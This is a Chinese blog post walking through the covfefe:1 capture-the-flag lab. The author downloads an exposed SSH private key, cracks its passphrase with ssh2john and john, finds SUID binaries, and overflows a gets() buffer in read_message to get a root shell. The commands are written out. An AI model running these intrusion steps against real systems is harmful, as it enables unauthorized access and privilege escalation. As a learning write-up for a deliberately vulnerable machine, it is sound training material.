-<p><img src="/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/5.png"><br><img src="/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/6.png"><br>给了两个网页都没东西，用字典工具跑一下看看有没有别的发现<br><img src="/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/8.png"><br>先去/robots.txt看看<br><img src="/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/9.png"><br>前两个都属于配置文件，不用太关注，直接访问/taxes目录<br>获得了第一个flag    flag1{make_america_great_again}<br><img src="/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/10.png"><br>好家伙，看来国外的CTF也喜欢玩梗哈哈哈<br>在访问一下/.ssh<br><img src="/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/11.png"><br><img src="/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/12.png"><br>尝试下载私钥，发现可以下载，那就说明这里有一处漏洞了。<br>拿到私钥我们就无需密码即可进行ssh链接。<br>首先需要修改权限，必须是600！必须是600！</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod 600 id_rsa</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/13.png"><br>修改权限后，进行链接。<br>账户在关键字中有泄露<br><img src="/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/14.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -i id_rsa simon@192.168.155.146   </span><br></pre></td></tr></table></figure>
-<p><img src="/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/15.png"><br>还是需要密码，需要用john进行破解<br>先用ssh2john.py转换成john可识别的信息</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python /usr/share/john/ssh2john.py id_rsa &gt; 1</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/16.png"><br>破解。<br><img src="/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/17.png"><br>破解出来了，接着ssh链接。<br><img src="/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/18.png"><br>链接成功。</p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>跳转到/root目录发现有flag文件，但是没有权限打不开。<br><img src="/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/19.png"><br>不是root权限，需要提权<br><img src="/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/20.png"><br>查找root权限可执行文件。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/21.png"><br><code>/root</code>目录下有个<code>read_message</code>，这不巧了吗，能以root权限运行的程序里就有<code>read_message</code>，就从这里入手。<br>运行一下这个文件看看是什么。<br><img src="/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/22.png"><br>简单的pwn 通过栈溢出来获取flag。<br>程序的意思大概是如果你是Simon，就会调用execve函数，而这个函数调用程序使用的是root权限。然而buf[]只能储存20个字符，gets（buf）没有限制长度，超过20个字符的字符就会存到缓冲区，覆盖后面的内容。输入超过缓存长度的字符 超出的那部分为拥有root权限的路径。<br>Simon后面随便来十五个字符。</p>
-<p>本人菜，哪里解释错了欢迎师傅们指出来。</p>
-<p>运行文件，在Simon后面随便来十五个字符再加上/bin/sh即可提权成功。<br><img src="/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/23.png"><br>提权成功，拿到最后一个flag。<br>至此，渗透结束。</p>
-<hr>
-<p>本人萌新一枚，不足之处希望师傅们可以指出来让我好好学习一下。<br>最后，感谢你看到这里~o(<em>￣︶￣</em>)o</p>
 ]]></content>
       <categories>
         <category>靶机渗透记录</category>
